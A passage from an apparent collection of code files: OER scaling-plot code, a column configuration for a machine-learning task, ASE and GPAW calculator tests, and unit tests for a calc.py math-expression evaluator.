fig.add_axes([0.2, 0.2, 0.6, 0.6])\n    x1 = -1\n    x2 = 2.5\n    ax.axis([x1, x2, x1, ooh_oh_scaling(x2)])\n\n    ax.set_xlabel(r'$\\Delta$G$_{\\sf OH}$ (eV)')\n    ax.set_ylabel(r'$\\Delta$G$_{\\sf OOH}$,$\\Delta$G$_{\\sf O}$ (eV)')\n\n    xdata = []\n    ydata = []\n    y2data = []\n\n    #for i in range(3):\n    for i in range(len(calc_systems)):\n        xdata.append(calc_systems[i][0])\n        ydata.append(calc_systems[i][2])\n        y2data.append(calc_systems[i][1])\n\n    # print(xdata)\n    # print(ydata)\n\n    fit = polyfit(xdata, ydata, 1)\n    fit_fn = poly1d(fit)\n    # print(fit_fn)\n    aa = fit_fn[1]\n    bb = fit_fn[0]\n\n    fit1 = polyfit(xdata, y2data, 1)\n    fit_fn1 = poly1d(fit1)\n    # print(fit_fn1)\n\n    #print fit_fn[0], fit_fn[1]\n    #how bad is scaling\n    for i in range(len(calc_systems)):\n            error = calc_systems[i][2] - \\\n                (fit_fn[1] * calc_systems[i][0] + fit_fn[0])\n            # print(error, calc_systems[i])\n\n    xx = np.arange(x1, x2, delta)\n\n    # Plotting Scaling Lines\n    ax.plot(xx, fit_fn[1] * xx + fit_fn[0], '--',\n        lw=1, dashes=(3, 1), c='grey', label='OOH scaling',\n        )\n\n    ax.plot(xx, xx + 3.2, '--', lw=1, dashes=(3, 1), c='black')\n\n    ax.plot(xx, xx, '--', lw=1, dashes=(3, 1), c='black')\n\n    ax.plot(xx, fit_fn1[1] * xx + fit_fn1[0], '--',\n        lw=1, dashes=(3, 1), c='red', label='O scaling',\n        )\n\n    for i in range(len(calc_systems)):\n        ax.plot(\n            calc_systems[i][0],\n            calc_systems[i][2],\n            'ro',\n            ms=3,\n            marker=calc_systems[i][11],\n            #alpha=0.2,\n            color=calc_systems[i][10],\n            )\n\n        ax.plot(\n            calc_systems[i][0],\n            calc_systems[i][1],\n            'ro',\n            ms=3,\n            marker=calc_systems[i][11],\n            #alpha=0.2,\n            color=calc_systems[i][10],\n            )\n\n        ax.plot(\n            calc_systems[i][0],\n            calc_systems[i][0],\n            calc_systems[i][9],\n            mec=calc_systems[i][5],\n            mfc=calc_systems[i][10],\n            mew=0.8,\n            zorder=4,\n            marker=calc_systems[i][11],\n            label=calc_systems[i][4] + ' : %.2f V' % (calc_systems[i][3]),\n            )\n\n        # ax.text(calc_systems[i][0],\n        # calc_systems[i][0]+calc_systems[i][7]+0.08,\n        # calc_systems[i][4]+'(%.2f)' %(calc_systems[i][3]),\n        # color='black',fontsize=6,horizontalalignment='center',\n        # rotation=0,zorder=1)\n\n    ax.legend(\n        bbox_to_anchor=(1.05, 1.05),\n        loc=2,\n        borderaxespad=0.5,\n        ncol=1,\n        fancybox=True,\n        shadow=True,\n        fontsize='x-small',\n        handlelength=2,\n        )\n\n\n    fig_path_i = os.path.join(\n        plots_folder,\n        \"OER_scaling.pdf\",\n        )\n\n    if not os.path.exists(plots_folder):\n        os.makedirs(plots_folder)\n\n    fig.savefig(\n        fig_path_i,\n        bbox_inches=\"tight\",\n        )\n\n    # fig.savefig('OER_scaling.pdf', bbox_inches='tight')\n\n    fig.clf()\n\n    #__| **********************************************************************\n\n    # | - OER_1D_plot **********************************************************\n    ax = fig.add_axes([0.2, 0.2, 0.6, 0.6])\n\n    #x1=1.23-1\n    #x2=1.23+1\n    #y2=1\n    #y1=0\n\n    x1 = 0.5\n    x2 = 2.8\n    y2 = 2.83\n    y1 = 1.23\n\n    ax.axis([x1, x2, y1, y2])\n    delta = 0.01\n    x = np.arange(x1, x2, delta)\n\n    ax.set_xlabel(r'$\\Delta$G$_{\\sf O}-\\Delta$G$_{\\sf OH}$ (eV)')\n\n    #ax.set_ylabel(r'$\\Delta$G$_{\\sf O}$ (eV)')\n    # ax.set_ylabel(r'U_{\\sf OER}$ (V)')\n\n    ax.set_ylabel(r'$\\eta_{\\sf OER}$')\n    ax.set_ylim(ax.get_ylim()[::-1])\n    plot(\n        x,\n        np.maximum(x, 3.2 - x),\n        '--',\n        color='black',\n        lw=0.67,\n        dashes=(3, 1),\n        zorder=2,\n        )\n\n    # | - __old__\n    #plot(x,1.23,'--',color='black',lw=0.67, dashes=(3,1),zorder=2)\n    # xy=np.array([xp for xp in x if 1.55", "553": "# set the path-to-files\nTRAIN_FILE = \"./data/train.csv\"\nTEST_FILE = \"./data/test.csv\"\n\nSUB_DIR = \"./output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    # 'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    # 'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    # 'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    # 'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    # 'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "554": "import pytest\nfrom ase.build import bulk\n\n\ndef verify(calc):\n    assert calc.get_fermi_level() is not None\n    assert calc.get_ibz_k_points() is not None\n    assert calc.get_eigenvalues(spin=0, kpt=0) is not None\n    assert calc.get_number_of_spins() is not None\n    assert calc.get_k_point_weights() is not None\n\n\n@pytest.mark.calculator_lite\ndef test_main(espresso_factory):\n    atoms = bulk('Si')\n    atoms.calc = espresso_factory.calc()\n    atoms.get_potential_energy()\n    verify(atoms.calc)\n\n\n@pytest.mark.calculator_lite\ndef test_smearing(espresso_factory):\n    atoms = bulk('Cu')\n    input_data = {'system':{'occupations': 'smearing',\n                            'smearing': 'fermi-dirac',\n                            'degauss': 0.02}}\n    atoms.calc = espresso_factory.calc(input_data=input_data)\n    atoms.get_potential_energy()\n    verify(atoms.calc)\n", "555": "\"\"\"\nUnit tests for calc.py\n\"\"\"\n\nimport unittest\nimport numpy\nimport calc\nfrom pyparsing import ParseException\n\n# numpy's default behavior when it evaluates a function outside its domain\n# is to raise a warning (not an exception) which is then printed to STDOUT.\n# To prevent this from polluting the output of the tests, configure numpy to\n# ignore it instead.\n# See http://docs.scipy.org/doc/numpy/reference/generated/numpy.seterr.html\nnumpy.seterr(all='ignore')  # Also: 'ignore', 'warn' (default), 'raise'\n\n\nclass EvaluatorTest(unittest.TestCase):\n    \"\"\"\n    Run tests for calc.evaluator\n    Go through all functionalities as specifically as possible--\n    work from number input to functions and complex expressions\n    Also test custom variable substitutions (i.e.\n      `evaluator({'x':3.0}, {}, '3*x')`\n    gives 9.0) and more.\n    \"\"\"\n\n    def test_number_input(self):\n        \"\"\"\n        Test different kinds of float inputs\n\n        See also\n          test_trailing_period (slightly different)\n          test_exponential_answer\n          test_si_suffix\n        \"\"\"\n        easy_eval = lambda x: calc.evaluator({}, {}, x)\n\n        self.assertEqual(easy_eval(\"13\"), 13)\n        self.assertEqual(easy_eval(\"3.14\"), 3.14)\n        self.assertEqual(easy_eval(\".618033989\"), 0.618033989)\n\n        self.assertEqual(easy_eval(\"-13\"), -13)\n        self.assertEqual(easy_eval(\"-3.14\"), -3.14)\n        self.assertEqual(easy_eval(\"-.618033989\"), -0.618033989)\n\n    def test_period(self):\n        \"\"\"\n        The string '.' should not evaluate to anything.\n        \"\"\"\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '.')\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '1+.')\n\n    def test_trailing_period(self):\n        \"\"\"\n        Test that things like '4.' will be 4 and not throw an error\n        \"\"\"\n        self.assertEqual(4.0, calc.evaluator({}, {}, '4.'))\n\n    def test_exponential_answer(self):\n        \"\"\"\n        Test for correct interpretation of scientific notation\n        \"\"\"\n        answer = 50\n        correct_responses = [\n            \"50\", \"50.0\", \"5e1\", \"5e+1\",\n            \"50e0\", \"50.0e0\", \"500e-1\"\n        ]\n        incorrect_responses = [\"\", \"3.9\", \"4.1\", \"0\", \"5.01e1\"]\n\n        for input_str in correct_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to equal {1}\".format(\n                input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n        for input_str in incorrect_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to not equal {1}\".format(\n                input_str, answer\n            )\n            self.assertNotEqual(answer, result, msg=fail_msg)\n\n    def test_si_suffix(self):\n        \"\"\"\n        Test calc.py's unique functionality of interpreting si 'suffixes'.\n\n        For instance '%' stand for 1/100th so '1%' should be 0.01\n        \"\"\"\n        test_mapping = [\n            ('4.2%', 0.042)\n        ]\n\n        for (expr, answer) in test_mapping:\n            tolerance = answer * 1e-6  # Make rel. tolerance, because of floats\n            fail_msg = \"Failure in testing suffix '{0}': '{1}' was not {2}\"\n            fail_msg = fail_msg.format(expr[-1], expr, answer)\n            self.assertAlmostEqual(\n                calc.evaluator({}, {}, expr), answer,\n                delta=tolerance, msg=fail_msg\n            )\n\n    def test_operator_sanity(self):\n        \"\"\"\n        Test for simple things like '5+2' and '5/2'\n        \"\"\"\n        var1 = 5.0\n        var2 = 2.0\n        operators = [('+', 7), ('-', 3), ('*', 10), ('/', 2.5), ('^', 25)]\n\n        for (operator, answer) in operators:\n            input_str = \"{0} {1} {2}\".format(var1, operator, var2)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on operator '{0}': '{1}' was not {2}\".format(\n                operator, input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n    def test_raises_zero_division_err(self):\n        \"\"\"\n        Ensure division by zero gives an error\n        \"\"\"\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0.0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({'x': 0.0}, {}, '1/x')\n\n    def test_parallel_resistors(self):\n        \"\"\"\n        Test the parallel resistor operator ||\n\n        The formula is given by\n            a || b || c ...\n            = 1 / (1/a + 1/b + 1/c + ...)\n        It is the resistance of a parallel circuit of resistors with resistance\n        a, b, c, etc&. See if this evaulates correctly.\n        \"\"\"\n        self.assertEqual(calc.evaluator({}, {}, '1||1'), 0.5)\n        self.assertEqual(calc.evaluator({}, {}, '1||1||2'), 0.4)\n        self.assertEqual(calc.evaluator({}, {}, \"j||1\"), 0.5 + 0.5j)\n\n    def test_parallel_resistors_with_zero(self):\n        \"\"\"\n        Check the behavior of the || operator with 0\n        \"\"\"\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0.0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({'x': 0.0}, {}, 'x||1')))\n\n    def assert_function_values(self, fname, ins, outs, tolerance=1e-3):\n        \"\"\"\n        Helper function to test many values at once\n\n        Test the accuracy of evaluator's use of the function given by fname\n        Specifically, the equality of `fname(ins[i])` against outs[i].\n        This is used later to test a whole bunch of f(x) = y at a time\n        \"\"\"\n\n        for (arg, val) in zip(ins, outs):\n            input_str = \"{0}({1})\".format(fname, arg)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on function {0}: '{1}' was not {2}\".format(\n                fname, input_str, val\n            )\n            self.assertAlmostEqual(val, result, delta=tolerance, msg=fail_msg)\n\n    def test_trig_functions(self):\n        \"\"\"\n        Test the trig functions provided in calc.py\n\n        which are: sin, cos, tan, arccos, arcsin, arctan\n        \"\"\"\n\n        angles = ['-pi/4', '0', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sin_values = [-0.707, 0, 0.5, 0.588, -0.707, 0.707, 1.298 + 0.635j]\n        cos_values = [0.707, 1, 0.866, 0.809, -0.707, 0.707, 0.834 - 0.989j]\n        tan_values = [-1, 0, 0.577, 0.727, 1, 1, 0.272 + 1.084j]\n        # Cannot test tan(pi/2) b/c pi/2 is a float and not precise...\n\n        self.assert_function_values('sin', angles, sin_values)\n        self.assert_function_values('cos', angles, cos_values)\n        self.assert_function_values('tan', angles, tan_values)\n\n        # Include those where the real part is between -pi/2 and pi/2\n        arcsin_inputs = ['-0.707', '0', '0.5', '0.588', '1.298 + 0.635*j', '-1.1', '1.1']\n        arcsin_angles = [-0.785, 0, 0.524, 0.629, 1 + 1j, -1.570 + 0.443j, 1.570 - 0.443j]\n        self.assert_function_values('arcsin', arcsin_inputs, arcsin_angles)\n\n        # Include those where the real part is between 0 and pi\n        arccos_inputs = ['1', '0.866', '0.809', '0.834-0.989*j', '-1.1', '1.1']\n        arccos_angles = [0, 0.524, 0.628, 1 + 1j, 3.141 - 0.443j, 0.443j]\n        self.assert_function_values('arccos', arccos_inputs, arccos_angles)\n\n        # Has the same range as arcsin\n        arctan_inputs = ['-1', '0', '0.577', '0.727', '0.272 + 1.084*j']\n        arctan_angles = arcsin_angles\n        self.assert_function_values('arctan', arctan_inputs, arctan_angles)\n\n    def test_reciprocal_trig_functions(self):\n        \"\"\"\n        Test the reciprocal trig functions provided in calc.py\n\n        which are: sec, csc, cot, arcsec, arccsc, arccot\n        \"\"\"\n        angles = ['-pi/4', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sec_values = [1.414, 1.155, 1.236, -1.414, 1.414, 0.498 + 0.591j]\n        csc_values = [-1.414, 2, 1.701, -1.414, 1.414, 0.622 - 0.304j]\n        cot_values = [-1, 1.732, 1.376, 1, 1, 0.218 - 0.868j]\n\n        self.assert_function_values('sec', angles, sec_values)\n        self.assert_function_values('csc', angles, csc_values)\n        self.assert_function_values('cot', angles, cot_values)\n\n        arcsec_inputs = ['1.1547', '1.2361', '2', '-2', '-1.4142', '0.4983+0.5911*j']\n        arcsec_angles = [0.524, 0.628, 1.047, 2.094, 2.356, 1 + 1j]\n        self.assert_function_values('arcsec', arcsec_inputs, arcsec_angles)\n\n        arccsc_inputs = ['-1.1547', '-1.4142', '2', '1.7013', '1.1547', '0.6215-0.3039*j']\n        arccsc_angles = [-1.047, -0.785, 0.524, 0.628, 1.047, 1 + 1j]\n        self.assert_function_values('arccsc', arccsc_inputs, arccsc_angles)\n\n        # Has the same range as arccsc\n        arccot_inputs = ['-0.5774', '-1', '1.7321', '1.3764', '0.5774', '(0.2176-0.868*j)']\n        arccot_angles = arccsc_angles\n        self.assert_function_values('arccot', arccot_inputs, arccot_angles)\n\n    def test_hyperbolic_functions(self):\n        \"\"\"\n        Test the hyperbolic functions\n\n        which are: sinh, cosh, tanh, sech, csch, coth\n        \"\"\"\n        inputs = ['0', '0.5', '1', '2', '1+j']\n        neg_inputs = ['0', '-0.5', '-1', '-2', '-1-j']\n        negate = lambda x: [-k for k in x]\n\n        # sinh is odd\n        sinh_vals = [0, 0.521, 1.175, 3.627, 0.635 + 1.298j]\n        self.assert_function_values('sinh', inputs, sinh_vals)\n        self.assert_function_values('sinh', neg_inputs, negate(sinh_vals))\n\n        # cosh is even - do not negate\n        cosh_vals = [1, 1.128, 1.543, 3.762, 0.834 + 0.989j]\n        self.assert_function_values('cosh', inputs, cosh_vals)\n        self.assert_function_values('cosh', neg_inputs, cosh_vals)\n\n        # tanh is odd\n        tanh_vals = [0, 0.462, 0.762, 0.964, 1.084 + 0.272j]\n        self.assert_function_values('tanh', inputs, tanh_vals)\n        self.assert_function_values('tanh', neg_inputs, negate(tanh_vals))\n\n        # sech is even - do not negate\n        sech_vals = [1, 0.887, 0.648, 0.266, 0.498 - 0.591j]\n        self.assert_function_values('sech', inputs, sech_vals)\n        self.assert_function_values('sech', neg_inputs, sech_vals)\n\n        # the following functions do not have 0 in their domain\n        inputs = inputs[1:]\n        neg_inputs = neg_inputs[1:]\n\n        # csch is odd\n        csch_vals = [1.919, 0.851, 0.276, 0.304 - 0.622j]\n        self.assert_function_values('csch', inputs, csch_vals)\n        self.assert_function_values('csch', neg_inputs, negate(csch_vals))\n\n        # coth is odd\n        coth_vals = [2.164, 1.313, 1.037, 0.868 - 0.218j]\n        self.assert_function_values('coth', inputs, coth_vals)\n        self.assert_function_values('coth', neg_inputs, negate(coth_vals))\n\n    def test_hyperbolic_inverses(self):\n        \"\"\"\n        Test the inverse hyperbolic functions\n\n        which are of the form arc[X]h\n        \"\"\"\n        results = [0, 0.5, 1, 2, 1 + 1j]\n\n        sinh_vals = ['0', '0.5211', '1.1752', '3.6269', '0.635+1.2985*j']\n        self.assert_function_values('arcsinh', sinh_vals, results)\n\n        cosh_vals = ['1', '1.1276', '1.5431', '3.7622', '0.8337+0.9889*j']\n        self.assert_function_values('arccosh', cosh_vals, results)\n\n        tanh_vals = ['0', '0.4621', '0.7616', '0.964', '1.0839+0.2718*j']\n        self.assert_function_values('arctanh', tanh_vals, results)\n\n        sech_vals = ['1.0', '0.8868', '0.6481', '0.2658', '0.4983-0.5911*j']\n        self.assert_function_values('arcsech', sech_vals, results)\n\n        results = results[1:]\n        csch_vals = ['1.919', '0.8509', '0.2757', '0.3039-0.6215*j']\n        self.assert_function_values('arccsch', csch_vals, results)\n\n        coth_vals = ['2.164', '1.313', '1.0373', '0.868-0.2176*j']\n        self.assert_function_values('arccoth', coth_vals, results)\n\n    def test_other_functions(self):\n        \"\"\"\n        Test the non-trig functions provided in calc.py\n\n        Specifically:\n          sqrt, log10, log2, ln, abs,\n          fact, factorial\n        \"\"\"\n\n        # Test sqrt\n        self.assert_function_values(\n            'sqrt',\n            [0, 1, 2, 1024],  # -1\n            [0, 1, 1.414, 32]  # 1j\n        )\n        # sqrt(-1) is NAN not j (!!).\n\n        # Test logs\n        self.assert_function_values(\n            'log10',\n            [0.1, 1, 3.162, 1000000, '1+j'],\n            [-1, 0, 0.5, 6, 0.151 + 0.341j]\n        )\n        self.assert_function_values(\n            'log2',\n            [0.5, 1, 1.414, 1024, '1+j'],\n            [-1, 0, 0.5, 10, 0.5 + 1.133j]\n        )\n        self.assert_function_values(\n            'ln',\n            [0.368, 1, 1.649, 2.718, 42, '1+j'],\n            [-1, 0, 0.5, 1, 3.738, 0.347 + 0.785j]\n        )\n\n        # Test abs\n        self.assert_function_values('abs', [-1, 0, 1, 'j'], [1, 0, 1, 1])\n\n        # Test factorial\n        fact_inputs = [0, 1, 3, 7]\n        fact_values = [1, 1, 6, 5040]\n        self.assert_function_values('fact', fact_inputs, fact_values)\n        self.assert_function_values('factorial', fact_inputs, fact_values)\n\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(0.5)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(0.5)\")\n\n    def test_constants(self):\n        \"\"\"\n        Test the default constants provided in calc.py\n\n        which are: j (complex number), e, pi\n        \"\"\"\n\n        # Of the form ('expr', python value, tolerance (or None for exact))\n        default_variables = [\n            ('i', 1j, None),\n            ('j', 1j, None),\n            ('e', 2.7183, 1e-4),\n            ('pi', 3.1416, 1e-4),\n        ]\n        for (variable, value, tolerance) in default_variables:\n            fail_msg = \"Failed on constant '{0}', not within bounds\".format(\n                variable\n            )\n            result = calc.evaluator({}, {}, variable)\n            if tolerance is None:\n                self.assertEqual(value, result, msg=fail_msg)\n            else:\n                self.assertAlmostEqual(\n                    value, result,\n                    delta=tolerance, msg=fail_msg\n                )\n\n    def test_complex_expression(self):\n        \"\"\"\n        Calculate combinations of operators and default functions\n        \"\"\"\n\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"(2^2+1.0)/sqrt(5e0)*5-1\"),\n            10.180,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"1+1/(1+1/(1+1/(1+1)))\"),\n            1.6,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"10||sin(7+5)\"),\n            -0.567, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"sin(e)\"),\n            0.41, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"e^(j*pi)\"),\n            -1, delta=1e-5\n        )\n\n    def test_explicit_sci_notation(self):\n        \"\"\"\n        Expressions like 1.6*10^-3 (not 1.6e-3) it should evaluate.\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^-3\"),\n            -0.0016\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(-3)\"),\n            -0.0016\n        )\n\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^3\"),\n            -1600\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(3)\"),\n            -1600\n        )\n\n    def test_simple_vars(self):\n        \"\"\"\n        Substitution of variables into simple equations\n        \"\"\"\n        variables = {'x': 9.72, 'y': 7.91, 'loooooong': 6.4, \"f_0'\": 2.0, \"T_{ijk}^{123}''\": 5.2}\n\n        # Should not change value of constant\n        # even with different numbers of variables...\n        self.assertEqual(calc.evaluator({'x': 9.72}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator(variables, {}, '13'), 13)\n\n        # Easy evaluation\n        self.assertEqual(calc.evaluator(variables, {}, 'x'), 9.72)\n        self.assertEqual(calc.evaluator(variables, {}, 'y'), 7.91)\n        self.assertEqual(calc.evaluator(variables, {}, 'loooooong'), 6.4)\n        self.assertEqual(calc.evaluator(variables, {}, \"f_0'\"), 2.0)\n        self.assertEqual(calc.evaluator(variables, {}, \"T_{ijk}^{123}''\"), 5.2)\n\n        # Test a simple equation\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, '3*x-y'),\n            21.25, delta=0.01  # = 3 * 9.72 - 7.91\n        )\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, 'x*y'),\n            76.89, delta=0.01\n        )\n\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, \"13\"), 13)\n        self.assertEqual(calc.evaluator(variables, {}, \"13\"), 13)\n        self.assertEqual(\n            calc.evaluator(\n                {'a': 2.2997471478310274, 'k': 9, 'm': 8, 'x': 0.6600949841121},\n                {}, \"5\"\n            ),\n            5\n        )\n\n    def test_variable_case_sensitivity(self):\n        \"\"\"\n        Test the case sensitivity flag and corresponding behavior\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({'R1': 2.0, 'R3': 4.0}, {}, \"r1*r3\"),\n            8.0\n        )\n\n        variables = {'E': 1.0}\n        self.assertEqual(\n            calc.evaluator(variables, {}, \"E\", case_sensitive=True),\n            1.0\n        )\n        # Recall 'e' is a default constant, with value 2.718\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, \"e\", case_sensitive=True),\n            2.718, delta=0.02\n        )\n\n    def test_simple_funcs(self):\n        \"\"\"\n        Subsitution of custom functions\n        \"\"\"\n        variables = {'x': 4.712}\n        functions = {'id': lambda x: x}\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator(variables, functions, 'id(x)'), 4.712)\n\n        functions.update({'f': numpy.sin})\n        self.assertAlmostEqual(\n            calc.evaluator(variables, functions, 'f(x)'),\n            -1, delta=1e-3\n        )\n\n    def test_function_case_insensitive(self):\n        \"\"\"\n        Test case insensitive evaluation\n\n        Normal functions with some capitals should be fine\n        \"\"\"\n        self.assertAlmostEqual(\n            -0.28,\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=False),\n            delta=1e-3\n        )\n\n    def test_function_case_sensitive(self):\n        \"\"\"\n        Test case sensitive evaluation\n\n        Incorrectly capitilized should fail\n        Also, it should pick the correct version of a function.\n        \"\"\"\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'SiN'):\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=True)\n\n        # With case sensitive turned on, it should pick the right function\n        functions = {'f': lambda x: x, 'F': lambda x: x + 1}\n        self.assertEqual(\n            6, calc.evaluator({}, functions, 'f(6)', case_sensitive=True)\n        )\n        self.assertEqual(\n            7, calc.evaluator({}, functions, 'F(6)', case_sensitive=True)\n        )\n\n    def test_undefined_vars(self):\n        \"\"\"\n        Check to see if the evaluator catches undefined variables\n        \"\"\"\n        variables = {'R1': 2.0, 'R3': 4.0}\n\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'QWSEKO'):\n            calc.evaluator({}, {}, \"5+7*QWSEKO\")\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'r2'):\n            calc.evaluator({'r1': 5}, {}, \"r1+r2\")\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'r1 r3'):\n            calc.evaluator(variables, {}, \"r1*r3\", case_sensitive=True)\n\n    def test_mismatched_parens(self):\n        \"\"\"\n        Check to see if the evaluator catches mismatched parens\n        \"\"\"\n        with self.assertRaisesRegexp(calc.UnmatchedParenthesis, 'opened but never closed'):\n            calc.evaluator({}, {}, \"(1+2\")\n        with self.assertRaisesRegexp(calc.UnmatchedParenthesis, 'no matching opening parenthesis'):\n            calc.evaluator({}, {}, \"(1+2))\")\n", "556": "import sys\nimport os\n#Importing issue with gpaw-python?\n#However cannot use this for module importing\nsys.path.append(os.path.join(os.path.dirname(__file__), \"../../\"))\nimport numpy\nfrom bulk.build import StructureBuilder\nfrom bulk.calc import MaterCalc\nimport unittest\nfrom bulk.build import StructureBuilder\nfrom ase.parallel import parprint, world\nfrom ase.dft.bandgap import bandgap\nfrom ase.dft.kpoints import special_paths, get_cellinfo\nfrom ase.units import Ha\n\nfrom gpaw import GPAW, PW, FermiDirac\nfrom gpaw.xc.exx import EXX\nfrom gpaw.xc.tools import vxc\n\nclass Test(unittest.TestCase):\n    def test_bs(self):\n        sb = StructureBuilder()\n        atoms, *_ = sb.get_structure(\"C\", \"diamond\")\n        # print(atoms)\n        base_dir = os.path.join(os.path.dirname(__file__),\n                                \"../../tmp/C-class/\")\n        m_calc = MaterCalc(atoms=atoms,\n                           base_dir=base_dir)\n        self.assertTrue(m_calc.relax(fmax=0.002))  # Very tight limit!\n        self.assertTrue(m_calc.ground_state())\n        # get the PBE BS\n        lattice_type = get_cellinfo(m_calc.atoms.cell).lattice\n        self.assertTrue(lattice_type in special_paths.keys())\n        kpts_bs = dict(path=special_paths[lattice_type],\n                       npoints=120)\n        # HSE06 base generate\n        gs_file = os.path.join(base_dir, \"gs.gpw\")\n        _calc = GPAW(restart=gs_file)\n        atoms = _calc.atoms.copy()\n        calc = GPAW(**_calc.parameters)\n        calc.set(kpts=dict(gamma=True,\n                           density=4))  # low density calculations\n        calc.atoms = atoms\n        del _calc\n        calc.get_potential_energy()\n        calc.write(os.path.join(base_dir, \"hse.gpw\"), mode=\"all\")\n        calc = GPAW(restart=os.path.join(base_dir, \"hse.gpw\"),\n                    txt=None)\n        ns = calc.get_number_of_spins()\n        nk = len(calc.get_ibz_k_points())\n        nbands = calc.get_number_of_bands()\n        eigen_pbe = numpy.array([[calc.get_eigenvalues(spin=s,\n                                                       kpt=k) \\\n                                  for k in range(nk)]\\\n                                 for s in range(ns)])\n        parprint(\"EIGEN_PBE\", eigen_pbe.shape)\n        vxc_pbe = vxc(calc, \"PBE\")\n        parprint(\"VXC_PBE\", vxc_pbe.shape)\n        # world.barrier()\n        # HSE06 now\n        calc_hse = EXX(os.path.join(base_dir, \"hse.gpw\"),\n                       xc=\"HSE06\",\n                       bands=[0, nbands])\n        calc_hse.calculate()\n        vxc_hse = calc_hse.get_eigenvalue_contributions()\n        parprint(vxc_hse.shape)\n        parprint(vxc_hse)\n        eigen_hse = eigen_pbe - vxc_pbe + vxc_hse\n        \n        # HSE bandgap from just kpts\n        bg_hse_min, *_ = bandgap(eigenvalues=eigen_hse,\n                                 efermi=calc.get_fermi_level(),\n                                 direct=False)\n        bg_hse_dir, *_ = bandgap(eigenvalues=eigen_hse,\n                                 efermi=calc.get_fermi_level(),\n                                 direct=True)\n        parprint(\"HSE: E_min \\t E_dir\")\n        parprint(\"{:.3f}\\t{:.3f}\".format(bg_hse_min, bg_hse_dir))\n        \"\"\"\n        # get the gllbsc by steps\n        calc_ = GPAW(restart=gpw_name)\n        calc_gllb = 